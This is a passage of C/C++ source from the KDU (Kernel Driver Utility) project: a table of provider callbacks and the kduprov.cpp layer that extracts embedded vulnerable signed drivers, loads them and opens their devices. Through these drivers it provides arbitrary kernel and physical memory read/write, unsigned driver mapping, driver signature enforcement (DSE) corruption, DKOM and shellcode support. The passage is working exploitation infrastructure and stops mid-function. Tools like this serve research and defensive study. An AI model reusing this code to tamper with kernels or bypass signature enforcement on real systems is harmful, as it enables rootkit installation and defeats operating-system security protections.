        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)RweReadPhysicalMemory,
        (provWritePhysicalMemory)RweWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)AsrReadPhysicalMemory,
        (provWritePhysicalMemory)AsrWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },


    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)AsrRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)RweReadPhysicalMemory,
        (provWritePhysicalMemory)RweWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },


    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)AsrReadPhysicalMemory,
        (provWritePhysicalMemory)AsrWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)PmxDrvReadKernelVirtualMemory,
        (provWriteKernelVM)PmxDrvWriteKernelVirtualMemory,

        (provVirtualToPhysical)PmxDrvVirtualToPhysical,
        (provQueryPML4)PmxDrvQueryPML4Value,
        (provReadPhysicalMemory)PmxDrvReadPhysicalMemory,
        (provWritePhysicalMemory)PmxDrvWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)WRZeroReadPhysicalMemory,
        (provWritePhysicalMemory)WRZeroWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
     },

    {
        NULL,

        (provStartVulnerableDriver)NetEaseStartVulnerableDriver,
        (provStopVulnerableDriver)NetEaseStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)NetEaseReadVirtualMemory,
        (provWriteKernelVM)NetEaseWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)TpupReadKernelVirtualMemory,
        (provWriteKernelVM)TpupWriteKernelVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)TpupReadPhysicalMemory,
        (provWritePhysicalMemory)TpupWritePhysicalMemory,

        (provValidatePrerequisites)TpupValidatePrerequisites,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)TpwReadKernelVirtualMemory,
        (provWriteKernelVM)TpwWriteKernelVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)TpwReadPhysicalMemory,
        (provWritePhysicalMemory)TpwWritePhysicalMemory,

        (provValidatePrerequisites)TpupValidatePrerequisites,

        (provOpenProcess)NULL
    }
};

```

`Source/Hamakaze/kduprov.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       KDUPROV.CPP
*
*  VERSION:     1.45
*
*  DATE:        30 Nov 2025
*
*  Vulnerable drivers provider abstraction layer.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "kduplist.h"

PKDU_DB gProvTable = NULL;

PKDU_DB_ENTRY KDUProviderToDbEntry(
    _In_ ULONG ProviderId)
{
    if (gProvTable == NULL)
        return NULL;

    ULONG i;

    for (i = 0; i < gProvTable->NumberOfEntries; i++) {
        if (gProvTable->Entries[i].ProviderId == ProviderId)
            return &gProvTable->Entries[i];
    }

    return NULL;
}

/*
* KDUProvDetectHyperV
*
* Purpose:
*
* Detect hyperv presence.
*
*/
VOID KDUProvDetectHyperV(
    VOID
)
{
#define MSFT_HV "Microsoft Hv"
#define MSFT_HV_SIZE sizeof(MSFT_HV) - sizeof(CHAR)
#define HV_VENDOR_MAX 12

    ULONG returnLength = 0;
    SYSTEM_HYPERVISOR_DETAIL_INFORMATION hdi;
    PHV_VENDOR_AND_MAX_FUNCTION pvi;
    CHAR szVendor[32];

    RtlSecureZeroMemory(&hdi, sizeof(hdi));

    NTSTATUS ntStatus = NtQuerySystemInformation(SystemHypervisorDetailInformation,
        &hdi, sizeof(hdi), &returnLength);

    if (NT_SUCCESS(ntStatus)) {

        pvi = (PHV_VENDOR_AND_MAX_FUNCTION)&hdi.HvVendorAndMaxFunction.Data;

        if (RtlCompareMemory(MSFT_HV, pvi->VendorName, MSFT_HV_SIZE) == MSFT_HV_SIZE) {

            supPrintfEvent(kduEventInformation, "[+] MSFT hypervisor present\r\n");

        }
        else {
            __stosb((PBYTE)&szVendor, 0, sizeof(szVendor));
            RtlCopyMemory(szVendor, pvi->VendorName, HV_VENDOR_MAX);
            supPrintfEvent(kduEventInformation, "[+] The \"%s\" hypervisor present\r\n", szVendor);
        }

    }
    else {

        int CPUInfo[4] = { -1, -1, -1, -1 };

        __cpuid(CPUInfo, 1);
        if ((CPUInfo[2] >> 31) & 1) {
            
            __cpuid(CPUInfo, 0x40000000);
            __stosb((PBYTE)&szVendor, 0, sizeof(szVendor));
            RtlCopyMemory(szVendor, CPUInfo + 1, HV_VENDOR_MAX);
            supPrintfEvent(kduEventInformation, "[+] The \"%s\" hypervisor present\r\n", szVendor);

        }
    }
}

/*
* KDUFirmwareToString
*
* Purpose:
*
* Return human readable firmware name.
*
*/
LPCSTR KDUFirmwareToString(
    _In_ FIRMWARE_TYPE Firmware)
{
    switch (Firmware) {
    case FirmwareTypeBios:
        return "FirmwareTypeBios";
    case FirmwareTypeUefi:
        return "FirmwareTypeUefi";
    case FirmwareTypeUnknown:
    default:
        return "FirmwareTypeUnknown";
    }
}

/*
* KDUProvGetCount
*
* Purpose:
*
* Return count of available providers.
*
*/
ULONG KDUProvGetCount()
{
    return RTL_NUMBER_OF(g_KDUProviders);
}

/*
* KDUReferenceLoadDB
*
* Purpose:
*
* Return pointer to KDU database.
*
*/
PKDU_DB KDUReferenceLoadDB()
{
    return gProvTable;
}

/*
* KDUProvList
*
* Purpose:
*
* Output available providers.
*
*/
VOID KDUProvList()
{
    KDU_DB_ENTRY* provData;
    CONST CHAR* pszDesc;

    HINSTANCE hProv;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    hProv = KDUProviderLoadDB();
    if (hProv == NULL)
        return;

    for (ULONG i = 0; i < gProvTable->NumberOfEntries; i++) {
        provData = &gProvTable->Entries[i];

        printf_s("Provider # %lu, ResourceId # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
            provData->ProviderId,
            provData->ResourceId,
            provData->Description,
            provData->DriverName,
            provData->DeviceName);

        //
        // Show signer.
        //
        printf_s("\tSigned by: \"%ws\"\r\n",
            provData->SignerName);

        //
        // Shellcode support
        //
        printf_s("\tShellcode support mask: 0x%08x\r\n", provData->SupportedShellFlags);

        //
        // List provider flags.
        //
        if (provData->Flags)
            printf_s("\tProvider capabilities: \r\n");

        if (provData->SignatureWHQL)
            printf_s("\t->Driver is WHQL signed.\r\n");
        //
        // Some Realtek drivers are digitally signed 
        // after binary modification with wrong PE checksum as result.
        // Note: Windows 7 will not allow their load.
        //
        if (provData->IgnoreChecksum)
            printf_s("\t->Ignore invalid image checksum.\r\n");

        //
        // Some BIOS flashing drivers does not support unload.
        //
        if (provData->NoUnloadSupported)
            printf_s("\t->Driver does not support unload procedure.\r\n");

        if (provData->PML4FromLowStub)
            printf_s("\t->Virtual to physical addresses translation require PML4 query from low stub.\r\n");

        if (provData->NoVictim)
            printf_s("\t->No victim required.\r\n");

        if (provData->PhysMemoryBruteForce)
            printf_s("\t->Provider supports only physical memory brute-force.\r\n");

        if (provData->PreferPhysical)
            printf_s("\t->Physical memory access is preferred.\r\n");

        if (provData->PreferVirtual)
            printf_s("\t->Virtual memory access is preferred.\r\n");

        if (provData->CompanionRequired)
            printf_s("\t->Provider expects companion to be loaded.\r\n");

        if (provData->UseSymbols)
            printf_s("\t->MS symbols are required to query internal information.\r\n");

        if (provData->OpenProcessSupported)
            printf_s("\t->Driver can be used to open a handle for the specified process.\r\n");

        //
        // List "based" flags.
        //
        if (provData->DrvSourceBase != SourceBaseNone)
        {
            switch (provData->DrvSourceBase) {
            case SourceBaseWinIo:
                pszDesc = WINIO_BASE_DESC;
                break;
            case SourceBaseWinRing0:
                pszDesc = WINRING0_BASE_DESC;
                break;
            case SourceBasePhyMem:
                pszDesc = PHYMEM_BASE_DESC;
                break;
            case SourceBaseMapMem:
                pszDesc = MAPMEM_BASE_DESC;
                break;
            case SourceBaseRWEverything:
                pszDesc = RWEVERYTHING_BASE_DESC;
                break;
            default:
                pszDesc = "Unknown";
                break;
            }

            printf_s("\tBased on: %s\r\n", pszDesc);
        }

        //
        // Minimum support Windows build.
        //
        printf_s("\tMinimum supported Windows build: %lu\r\n",
            provData->MinNtBuildNumberSupport);

        //
        // Maximum support Windows build.
        //
        if (provData->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
            printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
        }
        else {
            printf_s("\tMaximum supported Windows build: %lu\r\n",
                provData->MaxNtBuildNumberSupport);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
}

/*
* KDUProvExtractVulnerableDriver
*
* Purpose:
*
* Extract vulnerable driver from resource.
*
*/
BOOL KDUProvExtractVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0, writeBytes;
    ULONG    uResourceId = Context->Provider->LoadData->ResourceId;
    LPWSTR   lpFullFileName = Context->DriverFileName;
    PBYTE    drvBuffer;

    //
    // Extract driver resource to the file.
    //
    drvBuffer = (PBYTE)KDULoadResource(uResourceId,
        Context->ModuleBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        Context->Provider->LoadData->IgnoreChecksum ? FALSE : TRUE);

    if (drvBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Driver resource id cannot be found %lu\r\n", uResourceId);

        return FALSE;
    }

    printf_s("[+] Extracting vulnerable driver as \"%ws\"\r\n", lpFullFileName);

    writeBytes = (ULONG)supWriteBufferToFile(lpFullFileName,
        drvBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(drvBuffer);

    if (resourceSize != writeBytes) {
        supShowHardError("[!] Unable to extract vulnerable driver", ntStatus);
        return FALSE;
    }

    return TRUE;
}

/*
* KDUProvLoadVulnerableDriver
*
* Purpose:
*
* Load provider vulnerable driver.
*
*/
BOOL KDUProvLoadVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    NTSTATUS ntStatus;

    LPWSTR   lpFullFileName = Context->DriverFileName;
    LPWSTR   lpDriverName = Context->Provider->LoadData->DriverName;


    if (!KDUProvExtractVulnerableDriver(Context))
        return FALSE;

    //
    // Load driver.
    //
    ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
    if (NT_SUCCESS(ntStatus)) {
        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
        bLoaded = TRUE;
    }
    else {

        supShowHardError("[!] Unable to load vulnerable driver", ntStatus);
        DeleteFile(lpFullFileName);
    }

    return bLoaded;
}

/*
* KDUProvIsAlreadyLoaded
*
* Purpose:
*
* Check if provider driver is already loaded by presence of it device object.
*
*/
BOOL KDUProvIsAlreadyLoaded(
    _In_ KDU_CONTEXT* Context
)
{
    LPWSTR lpRootDirectory;
    LPWSTR lpDeviceName = Context->Provider->LoadData->DeviceName;

    switch (Context->Provider->LoadData->ProviderId) {
    case KDU_PROVIDER_DELL_PCDOC:
        lpRootDirectory = (LPWSTR)L"\\GLOBAL??";
        break;
    default:
        lpRootDirectory = (LPWSTR)L"\\Device";
        break;
    }
    return supIsObjectExists(lpRootDirectory, lpDeviceName);
}

/*
* KDUProvStartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
BOOL KDUProvStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bLoaded = FALSE;

    //
    // Check if driver already loaded.
    //
    if (KDUProvIsAlreadyLoaded(Context)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        bLoaded = KDUProvLoadVulnerableDriver(Context);

    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }

    return (Context->DeviceHandle != NULL);
}

/*
* KDUProvOpenVulnerableDriverAndRunCallbacks
*
* Purpose:
*
* Open handle for vulnerable driver and run optional callbacks if they are defined.
*
*/
void KDUProvOpenVulnerableDriverAndRunCallbacks(
    _In_ KDU_CONTEXT* Context
)
{
    HANDLE deviceHandle = NULL;

    //
    // Run pre-open callback (optional).
    //
    if (Context->Provider->Callbacks.PreOpenDriver) {
        printf_s("[+] Executing pre-open callback for given provider\r\n");
        Context->Provider->Callbacks.PreOpenDriver((PVOID)Context);
    }

    NTSTATUS ntStatus = supOpenDriver(Context->Provider->LoadData->DeviceName,
            SYNCHRONIZE | WRITE_DAC | GENERIC_WRITE | GENERIC_READ,
            &deviceHandle);

    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to open vulnerable driver", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Driver device \"%ws\" has been opened successfully\r\n",
            Context->Provider->LoadData->DriverName);

        Context->DeviceHandle = deviceHandle;

        //
        // Run post-open callback (optional).
        //
        if (Context->Provider->Callbacks.PostOpenDriver) {

            printf_s("[+] Executing post-open callback for given provider\r\n");

            Context->Provider->Callbacks.PostOpenDriver((PVOID)Context);

        }

    }
}

/*
* KDUProvStopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void KDUProvStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    NTSTATUS ntStatus;
    LPWSTR lpDriverName = Context->Provider->LoadData->DriverName;
    LPWSTR lpFullFileName = Context->DriverFileName;

    ntStatus = supUnloadDriver(lpDriverName, TRUE);
    if (!NT_SUCCESS(ntStatus)) {

        supShowHardError("[!] Unable to unload vulnerable driver", ntStatus);

    }
    else {

        supPrintfEvent(kduEventInformation,
            "[+] Vulnerable driver \"%ws\" unloaded\r\n",
            lpDriverName);

        if (supDeleteFileWithWait(1000, 5, lpFullFileName))
            printf_s("[+] Vulnerable driver file removed\r\n");

        Context->ProviderState = StateUnloaded;

    }
}

/*
* KDUProviderPostOpen
*
* Purpose:
*
* Provider post-open driver generic callback.
*
*/
BOOL WINAPI KDUProviderPostOpen(
    _In_ PVOID Param
)
{
    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;
    PSECURITY_DESCRIPTOR driverSD = NULL;

    PACL defaultAcl = NULL;
    HANDLE deviceHandle;

    deviceHandle = Context->DeviceHandle;

    //
    // Check if we need to forcebly set SD.
    //
    if (Context->Provider->LoadData->NoForcedSD == FALSE) {

        //
        // At least make less mess.
        // However if driver author is an idiot just like Unwinder, it won't much help.
        //
        NTSTATUS ntStatus;

        ntStatus = supCreateSystemAdminAccessSD(&driverSD, &defaultAcl);

        if (NT_SUCCESS(ntStatus)) {

            ntStatus = NtSetSecurityObject(deviceHandle,
                DACL_SECURITY_INFORMATION,
                driverSD);

            if (!NT_SUCCESS(ntStatus)) {

                supShowHardError("[!] Unable to set driver device security descriptor", ntStatus);

            }
            else {
                printf_s("[+] Driver device security descriptor set successfully\r\n");
            }

            if (defaultAcl) supHeapFree(defaultAcl);
            supHeapFree(driverSD);

        }
        else {

            supShowHardError("[!] Unable to allocate security descriptor", ntStatus);

        }

    }

    //
    // Remove WRITE_DAC from result handle.
    //
    HANDLE strHandle = NULL;

    if (NT_SUCCESS(NtDuplicateObject(NtCurrentProcess(),
        deviceHandle,
        NtCurrentProcess(),
        &strHandle,
        SYNCHRONIZE | GENERIC_WRITE | GENERIC_READ,
        0,
        0)))
    {
        NtClose(deviceHandle);
        deviceHandle = strHandle;
    }

    Context->DeviceHandle = deviceHandle;

    return (deviceHandle != NULL);
}


/*
* KDUOpenProcess
*
* Purpose:
*
* Provider wrapper for OpenProcess routine.
*
*/
_Success_(return != FALSE)
BOOL WINAPI KDUOpenProcess(
    _In_ struct _KDU_CONTEXT* Context,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    BOOL bResult = FALSE;
    KDU_PROVIDER* prov = Context->Provider;

    __try {

        bResult = prov->Callbacks.OpenProcess(Context->DeviceHandle,
            ProcessId,
            DesiredAccess,
            ProcessHandle);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetLastError(GetExceptionCode());
        return FALSE;
    }
    return bResult;
}

/*
* KDUProviderLoadDB
*
* Purpose:
*
* Load drivers database file.
*
*/
HINSTANCE KDUProviderLoadDB(
    VOID
)
{
    HINSTANCE hInstance;
    KDU_DB_VERSION *pVersionInfo;
    BOOL bFailed = TRUE;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    SetDllDirectory(NULL);
    hInstance = LoadLibraryEx(DRV64DLL, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hInstance) {
        printf_s("[+] Drivers database \"%ws\" loaded at 0x%p\r\n", DRV64DLL, hInstance);

        do {

            pVersionInfo = (PKDU_DB_VERSION)GetProcAddress(hInstance, "gVersion");
            if (pVersionInfo == NULL) {
                supPrintfEvent(kduEventError, "[!] Providers version data not found\r\n");
                break;
            }

            if (pVersionInfo->MajorVersion != KDU_VERSION_MAJOR ||
                pVersionInfo->MinorVersion != KDU_VERSION_MINOR ||
                pVersionInfo->Revision != KDU_VERSION_REVISION ||
                pVersionInfo->Build != KDU_VERSION_BUILD)
            {
                supPrintfEvent(kduEventError, "[!] Providers database has wrong version, expected %lu.%lu.%lu.%lu, got %lu.%lu.%lu.%lu\r\n",
                    KDU_VERSION_MAJOR,
                    KDU_VERSION_MINOR,
                    KDU_VERSION_REVISION,
                    KDU_VERSION_BUILD,
                    pVersionInfo->MajorVersion,
                    pVersionInfo->MinorVersion,
                    pVersionInfo->Revision,
                    pVersionInfo->Build);

                break;
            }
            else {
                printf_s("[+] Drivers database version is OK\r\n");
            }

            gProvTable = (PKDU_DB)GetProcAddress(hInstance, "gProvTable");
            if (gProvTable == NULL) {
                supPrintfEvent(kduEventError, "[!] Providers table not found\r\n");
                break;
            }

            bFailed = FALSE;

        } while (FALSE);

        if (bFailed) {
            FreeLibrary(hInstance);
            hInstance = NULL;
        }

    }
    else {
        supShowWin32Error("[!] Cannot load drivers database", GetLastError());
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return hInstance;
}

BOOL KDUpRwHandlersAreSet(
    _In_opt_ PVOID ReadHandler,
    _In_opt_ PVOID WriteHandler
)
{
    if (ReadHandler == NULL ||
        WriteHandler == NULL)
    {

        supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
            "\tKDU interface is not implemented for these methods.\r\n");

        return FALSE;

    }

    return TRUE;
}

/*
* KDUProviderVerifyActionType
*
* Purpose:
*
* Verify key provider functionality.
*
*/
BOOL KDUProviderVerifyActionType(
    _In_ KDU_PROVIDER* Provider,
    _In_ KDU_ACTION_TYPE ActionType)
{
    BOOL bResult = TRUE;
    
#ifdef _DEBUG
    DbgPrint("KDUProviderVerifyActionType bypassed\r\n");
    return TRUE;
#endif

    //
    // Check mixed settings.
    //
    if (Provider->LoadData->PreferPhysical && Provider->LoadData->PreferVirtual) {
        supPrintfEvent(kduEventError,
            "[!] Abort: provider flags PreferPhysical and PreferVirtual cannot be combined\r\n");
        return FALSE;
    }

    switch (ActionType) {
    case ActionTypeDKOM:
    case ActionTypeMapDriver:
    case ActionTypeDSECorruption:

        //
        // Check if we can translate.
        //
        if (Provider->LoadData->PML4FromLowStub && Provider->Callbacks.VirtualToPhysical == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support memory translation or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            return FALSE;
        }

        if (Provider->LoadData->PreferPhysical || Provider->LoadData->PhysMemoryBruteForce) {

            //
            // Driver must have at least something defined.
            //
            BOOL bFirstTry = TRUE, bSecondTry = TRUE;

            if (Provider->Callbacks.ReadPhysicalMemory == NULL ||
                Provider->Callbacks.WritePhysicalMemory == NULL)
            {
                bFirstTry = FALSE;
            }

            if (Provider->Callbacks.ReadKernelVM == NULL ||
                Provider->Callbacks.WriteKernelVM == NULL)
            {
                bSecondTry = FALSE;
            }

            if (bFirstTry == FALSE && bSecondTry == FALSE) {
                supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary kernel read/write or\r\n"\
                    "\tKDU interface is not implemented for these methods.\r\n");
                return FALSE;
            }

        }

        break;

    case ActionTypeDumpProcess:

        if (Provider->Callbacks.OpenProcess == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support arbitrary process handle acquisition or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");
            return FALSE;

        }

        break;

    default:
        break;
    }

    switch (ActionType) {

    case ActionTypeDKOM:

        //
        // Check if we can read/write.
        //

        if (Provider->LoadData->PreferPhysical) {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadPhysicalMemory,
                (PVOID)Provider->Callbacks.WritePhysicalMemory))
            {
                bResult = FALSE;
            }

        }
        else {

            if (!KDUpRwHandlersAreSet(
                (PVOID)Provider->Callbacks.ReadKernelVM,
                (PVOID)Provider->Callbacks.WriteKernelVM))
            {
                bResult = FALSE;
            }

        }

        break;

    case ActionTypeMapDriver:

        //
        // Check if we can map.
        //
        if (Provider->Callbacks.MapDriver == NULL) {

            supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support driver mapping or\r\n"\
                "\tKDU interface is not implemented for these methods.\r\n");

            bResult = FALSE;

        }

        break;

    case ActionTypeDSECorruption:

        //
        // Check if we have DSE control callback set.
        //
        if ((PVOID)Provider->Callbacks.ControlDSE == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support changing DSE values or\r\n"\
                "\tKDU interface is not implemented for this method.\r\n");

            bResult = FALSE;

        }
        break;

    default:
        break;
    }

    return bResult;
}

VOID KDUFallBackOnLoad(
    _Inout_ PKDU_CONTEXT * Context
)
{
    PKDU_CONTEXT ctx = *Context;

    if (ctx->DeviceHandle)
        NtClose(ctx->DeviceHandle);

    if (ctx->Provider->Callbacks.StopVulnerableDriver)
        ctx->Provider->Callbacks.StopVulnerableDriver(ctx);

    if (ctx->DriverFileName)
        supHeapFree(ctx->DriverFileName);

    supHeapFree(ctx);
    *Context = NULL;
}

BOOL KDUIsSupportedShell(
    _In_ ULONG ShellCodeVersion,
    _In_ ULONG ProviderFlags)
{
    ULONG value;
    switch (ShellCodeVersion) {
    case KDU_SHELLCODE_V1:
        value = KDUPROV_SC_V1;
        break;
    case KDU_SHELLCODE_V2:
        value = KDUPROV_SC_V2;
        break;
    case KDU_SHELLCODE_V3:
        value = KDUPROV_SC_V3;
        break;
    case KDU_SHELLCODE_V4:
        value = KDUPROV_SC_V4;
        break;
    default:
        return FALSE;
    }

    return ((ProviderFlags & value) > 0);
}

/*
* KDUProviderCreate
*
* Purpose:
*
* Create Provider to work with it.
*
*/
PKDU_CONTEXT WINAPI KDUProviderCreate(
    _In_ ULONG ProviderId,
    _In_ ULONG HvciEnabled,
    _In_ ULONG NtBuildNumber,
    _In_ ULONG ShellCodeVersion,
    _In_ KDU_ACTION_TYPE ActionType
)
{
    HINSTANCE moduleBase;
    KDU_CONTEXT* Context = NULL;
    KDU_DB_ENTRY* provLoadData = NULL;
    KDU_PROVIDER* prov;
    NTSTATUS ntStatus;

    FIRMWARE_TYPE fmwType;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {

        if (ProviderId >= KDUProvGetCount()) {
            
            supPrintfEvent(kduEventInformation,
                "[+] Provider with id %lu is not supported, will be using default provider (0)\r\n",
                ProviderId);

            ProviderId = KDU_PROVIDER_DEFAULT;
        }

        //
        // Check HyperV
        //
        KDUProvDetectHyperV();

        //
        // Load drivers DB.
        //
        moduleBase = KDUProviderLoadDB();
        if (moduleBase == NULL) {
            break;
        }

        provLoadData = KDUProviderToDbEntry(ProviderId);
        if (provLoadData == NULL) {
            supPrintfEvent(kduEventError,
                "[!] Requested provider data was not found in database, abort\r\n");
            break;
        }

        prov = &g_KDUProviders[ProviderId];
        prov->LoadData = provLoadData;

        if (ShellCodeVersion != KDU_SHELLCODE_NONE) {
            if (!KDUIsSupportedShell(ShellCodeVersion, provLoadData->SupportedShellFlags)) {
                supPrintfEvent(kduEventError,
                    "[!] Selected shellcode %lu is not supported by this provider (supported mask: 0x%08x), abort\r\n",
                    ShellCodeVersion, provLoadData->SupportedShellFlags);
                break;
            }
        }

        ntStatus = supGetFirmwareType(&fmwType);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Failed to query firmware type", ntStatus);
        }
        else {

            supPrintfEvent(kduEventNone, "[+] Firmware type (%s)\r\n",
                KDUFirmwareToString(fmwType));
            /*
            if (provLoadData->PML4FromLowStub)
                if (fmwType != FirmwareTypeUefi) {

                    supPrintfEvent(kduEventError, "[!] Unsupported PC firmware type for this provider (req: %s, got: %s)\r\n",
                        KDUFirmwareToString(FirmwareTypeUefi),
                        KDUFirmwareToString(fmwType));

                    break;
                }
            */
        }

        //
        // Show provider info.
        //
        supPrintfEvent(kduEventInformation, "[+] Provider: \"%ws\", Name \"%ws\"\r\n",
            provLoadData->Description,
            provLoadData->DriverName);

        //
        // Check HVCI support.
        //
        if (HvciEnabled && provLoadData->SupportHVCI == 0) {

            supPrintfEvent(kduEventError,
                "[!] Abort: selected provider does not support HVCI\r\n");

            break;
        }

        //
        // Check current Windows NT build number.
        //

        if (NtBuildNumber < provLoadData->MinNtBuildNumberSupport) {

            supPrintfEvent(kduEventError,
